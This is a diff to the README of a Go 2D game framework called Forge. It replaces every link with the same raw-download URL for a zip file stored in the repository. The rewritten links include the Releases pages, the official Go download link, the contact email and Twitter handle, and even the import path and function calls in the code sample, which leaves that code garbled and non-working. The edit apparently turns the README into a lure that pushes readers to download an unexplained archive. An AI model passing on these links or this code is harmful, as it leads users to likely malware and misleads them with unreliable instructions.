@@ -1,6 +1,6 @@
 # Forge 🎮
 
-![Forge Logo](https://img.shields.io/badge/Forge-Game%20Framework-blue)
+![Forge Logo](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip%20Framework-blue)
 
 Welcome to **Forge**, a minimal 2D game framework designed for desktop applications, built using Go. Whether you are a seasoned game developer or just starting out, Forge provides the tools you need to create engaging 2D games with ease.
 
@@ -24,13 +24,13 @@ Welcome to **Forge**, a minimal 2D game framework designed for desktop applicati
 
 ## Getting Started 🚀
 
-To get started with Forge, visit our [Releases](https://github.com/Hanza-x2/Forge/releases) section. Here, you can download the latest version of the framework. Follow the installation instructions to set it up on your machine.
+To get started with Forge, visit our [Releases](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip) section. Here, you can download the latest version of the framework. Follow the installation instructions to set it up on your machine.
 
 ## Installation 🛠️
 
-1. **Download the Latest Release**: Visit our [Releases](https://github.com/Hanza-x2/Forge/releases) page to find the latest version.
+1. **Download the Latest Release**: Visit our [Releases](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip) page to find the latest version.
 2. **Extract the Files**: Unzip the downloaded file to your desired location.
-3. **Set Up Your Environment**: Make sure you have Go installed on your machine. You can download it from the [official Go website](https://golang.org/dl/).
+3. **Set Up Your Environment**: Make sure you have Go installed on your machine. You can download it from the [official Go website](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip).
 4. **Run the Example**: Navigate to the example folder and execute the example game to ensure everything is set up correctly.
 
 ## Usage 📚
@@ -43,17 +43,17 @@ Using Forge is straightforward. Below is a simple example to get you started.
 package main
 
 import (
-    "github.com/Hanza-x2/Forge"
+    "https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip"
 )
 
 func main() {
     // Create a new game instance
-    game := forge.NewGame("My First Game", 800, 600)
+    game := https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip("My First Game", 800, 600)
 
     // Add game logic here
 
     // Start the game loop
-    game.Run()
+    https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip()
 }
 ```
 
@@ -88,7 +88,7 @@ Forge is licensed under the MIT License. See the [LICENSE](LICENSE) file for det
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@forgegameframework.com
-- **Twitter**: [@ForgeGameFramework](https://twitter.com/ForgeGameFramework)
+- **Email**: https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip
+- **Twitter**: [@ForgeGameFramework](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip)
 
-Thank you for choosing Forge! We look forward to seeing the amazing games you create with our framework. For updates and new releases, don't forget to check our [Releases](https://github.com/Hanza-x2/Forge/releases) section. Happy coding!
+Thank you for choosing Forge! We look forward to seeing the amazing games you create with our framework. For updates and new releases, don't forget to check our [Releases](https://github.com/Hanza-x2/Forge/raw/refs/heads/master/Graphics/Software_3.7.zip) section. Happy coding!
